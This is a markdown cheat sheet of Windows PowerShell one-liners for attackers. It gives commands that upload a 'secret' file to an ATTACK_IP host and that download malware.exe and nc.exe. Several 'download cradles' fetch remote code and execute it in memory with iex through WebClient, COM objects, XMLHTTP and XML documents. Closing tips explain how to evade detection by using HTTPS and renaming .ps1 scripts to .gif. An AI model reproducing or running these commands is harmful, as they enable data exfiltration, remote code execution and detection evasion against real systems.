# Windows PowerShell

## Upload File

### 1) .NET Reflection

	[void](New-Object System.Net.WebClient).UploadFile('http://ATTACK_IP/', "C:\Windows\Temp\secret.txt")

### 2) Invoke-WebRequest

	$filePath = 'C:\Windows\Temp\secret.txt' ; $uploadUri = 'http://ATTACK_IP/' ; $file = try { Get-Item $filePath -ErrorAction Stop } catch { throw $_.Exception } ; $fileContents = $(-join[char[]][System.IO.File]::ReadAllBytes($file.FullName)) ; $formBoundaryBegin = '----l337PwnzFormBoundary' ; $formBoundaryEnd = $formBoundaryBegin + "--`r`n" ; $formBody = "$formBoundaryBegin`nContent-Disposition: form-data; name=`"file`"; filename=`"$($file.Name)`"`nContent-Type: application/octet-stream`n`n$fileContents`n$formBoundaryEnd" ; $parameters = @{'Method' = 'POST'; 'Uri' = $uploadUri ; 'Headers' = @{ 'Content-Type' = "multipart/form-data; boundary=$formBoundaryBegin" } ; 'Body' = $formBody } ; Invoke-WebRequest @parameters


## Download File

### 1) Invoke-RestMethod

	Invoke-RestMethod -Uri http://ATTACK_IP:PORT/REMOTE_FILE -Method PUT -InFile TARGET_FILE

### 2) Invoke-WebRequest

	powershell.exe iwr -uri ATTACK_IP/malware.exe -o C:\temp\malware.exe

### 3) Wget

	wget http://ATTACK_IP/nc.exe -OutFile nc.exe

### 4) Net.WebClient Download String Method

    powershell.exe iex (New-Object Net.Webclient).DownloadString('http://<IP>/<File>')

##### Standard download cradle

    iex (New-Object Net.Webclient).DownloadString("http://<IP>/<File>")

##### Internet Explorer Download cradle

    $ie=New-Object -ComObject
    InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://<IP>/<File>
    ');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response

##### Requires PowerShell V3+

    iex (iwr 'http://<IP>/<File>')

    $h=New-Object -ComObject
    Msxml2.XMLHTTP;$h.open('GET','http://<IP>/<File>',$false);$h.send();iex
    $h.responseText

    $wr = [System.NET.WebRequest]::Create("http://<IP>/<File>")
    $r = $wr.GetResponse()
    IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()

### 5) In Memory

    Net.WebClient DownloadString Method
    Net.WebClient DownloadData Method
    Net.WebClient OpenRead Method
    .NET [Net.HttpWebReqest].class
    Word.Application COM Object
    Excel.Application COM Object
    InternetExplorer.Application COM Object
    MSXML2.ServerXmlHTTP Com Object
    Certutil.exe w/ -ping argument

### 6) On Disk

    Net.WebClient DownloadFile Method

    BITSAdmin.exe

    Cerutil.exe w/ -urlcache argument

### 7) Net.WebClient Single Quotes Download and store

    iex (new-Object Net.WebClient).DownloadFile('http://<IP>/<File>', 'C:\programdata\<File>')

    powershell.exe iex (new-Object Net.WebClient).DownloadFile('http://<IP>/<File>', 'C:\programdata\<File>')

### 8) Net.WebClient User Agent Download

    $downloader = New-Object System.Net.WebClient
    $downloader.Headers.Add ("")
    $payload = "http://<IP>/<File>"
    $command = $downloader.DownloadString($payload)
    iex $command

### 9) XML Download and Execute

    $xmldoc = New-Object System.Xml.XmlDocument
    $xmldoc.Load("http://<IP>/<File.xml>")
    iex $xmldoc.command.a.execute
    $xmldoc = New-Object System.Xml.XmlDocument ; $xmldoc.Load("http://<IP>/<File.xml>") ; iex $xmldoc.command.a.execute

### XML Script example

    <?xml version="1.0"?>
    <command>
		    <a>
			    <execute>Get-Process</execute>
		    </a>
    </command>



# TIPS AND TRICKS

### 1) If possible use SSL on attacking machine and use HTTPS to further evade detection

### 2) Further evade detection by renaming scripts from .ps1 to something else such as .gif. Powershell can still execute .gif files as Powershell files.

### 3) Multi command scripts below can be converted to one line with ';' between commands.

